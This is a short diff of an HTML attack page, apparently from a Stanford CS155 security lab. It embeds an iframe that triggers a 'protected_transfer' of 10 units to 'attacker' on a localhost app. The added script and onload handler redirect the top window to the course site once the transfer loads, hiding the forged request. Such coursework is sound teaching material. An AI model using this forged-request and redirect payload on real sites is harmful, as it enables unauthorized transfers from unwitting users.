@@ -62,9 +62,12 @@
   </table>
 </form>
 
+        <script>
+          counter = 0
+        </script>
 
           <div id="attackiframe">
-            <iframe width="100%" height="100%" frameborder="0" src="http://localhost:3000/protected_transfer?user=attacker&quantity=10" />
+            <iframe width="100%" height="100%" frameborder="0" src="http://localhost:3000/protected_transfer?user=attacker&quantity=10" onload="if (counter == 1) { top.location='https://crypto.stanford.edu/cs155/' } else { counter = 1};"/>
         </div>
 
 </div>
